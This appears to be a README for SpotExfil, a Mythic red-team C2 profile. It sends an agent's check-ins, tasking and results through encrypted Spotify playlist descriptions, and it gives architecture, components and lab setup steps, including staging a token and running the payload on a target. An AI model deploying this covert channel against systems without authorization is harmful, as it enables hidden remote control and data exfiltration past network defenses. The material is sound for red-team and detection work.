# SpotExfil as a Mythic C2 Profile

SpotExfil integrates with [Mythic](https://github.com/its-a-feature/Mythic)
(SpecterOps) as a first-class C2 profile: any payload built with the bundled
**spotexfil** Payload Type tasks through encrypted Spotify playlist descriptions,
with Mythic's UI, tasking, and operator workflow fully intact.

```
┌──────────────┐   tasking    ┌───────────────────────┐   playlists   ┌─────────────┐
│  Mythic UI   │─────────────►│  spotify C2 profile   │──────────────►│   Spotify   │
│  (operators) │◄─────────────│  container (gRPC/HTTP)│◄──────────────│  playlists  │
└──────────────┘   responses  └───────────┬───────────┘               └──────▲──────┘
                                          │ cmd channel                        │ res
                                          ▼                                  │ channel
                                    ┌───────────────────────────────────────────┐
                                    │  spotexfil agent (target)                 │
                                    │  checkin / get_tasking / post_response    │
                                    └───────────────────────────────────────────┘
```

## Components

| Piece | Location | Role |
|-------|----------|------|
| C2 profile container | `mythic/C2_Profiles/spotify/` | Bridges Mythic ↔ playlist channels (gRPC push streaming, HTTP poll fallback) |
| Payload Type | `mythic/Payload_Type/spotexfil/` | Mythic-side agent definition + Python builder (cross-compiles the Go agent) |
| Agent | `go/cmd/mythicagent/` | The Go payload: checkin / get_tasking / post_response over playlists |
| Crypto mapping | `go/pkg/mythicmap/` | Byte-exact Mythic wire format (AESPSK + EKE), Python-verified interop vectors |
| Transport library | `go/pkg/{spotify,protocol,crypto,encoding,shared}` | Our Spotify engine, now public for external reuse |

## How it works

1. The operator creates a payload in Mythic, selecting the **spotify** C2 profile
   and the **spotexfil** payload type; Spotify credentials, poll interval/jitter,
   and the transport passphrase are payload parameters.
2. The builder cross-compiles `go/cmd/mythicagent` with config stamped via
   `-ldflags -X` (UUID, AES key, passphrase, Spotify creds, interval/jitter).
3. On the target, the agent **checks in** (encrypted envelope in a `res`-channel
   playlist), then polls `get_tasking`. Mythic's AESPSK crypto is the message
   layer; SpotExfil's chunk-layer encryption protects playlist metadata.
4. The profile container polls the `res` channel, extracts each envelope's UUID
   prefix (no decryption — a dumb pipe per Mythic's contract), and pushes it to
   Mythic via gRPC streaming. Tasking from Mythic is written to the `cmd`
   channel; agents filter by UUID before decrypting, so many agents can share
   one account.

## Setup (local lab)

```bash
# 1. Prerequisites: Docker, a Mythic server, a Spotify developer app + token
git clone https://github.com/sourcefrenchy/spotexfil
cd spotexfil/mythic

# 2. Install into a running Mythic
sudo /path/to/mythic-cli install github <this repo url> -f

# 3. In the Mythic UI: create a payload
#    Payload Type: spotexfil | C2 Profile: spotify
#    Set: target_os, passphrase, spotify creds, interval/jitter

# 4. Stage the token on the target, run the payload
SPOTIFY_TOKEN_JSON='{"access_token":"...","refresh_token":"...",...}' ./payload
```

## Status

Phase 1 (code + docs) complete: 50+ new tests, crypto interop proven against a
Python reference vector, all three target platforms cross-compile.
Phase 2 (local Mythic validation + upstream PRs to `MythicMeta/overview` and
the agent repo) is tracked in the project README.
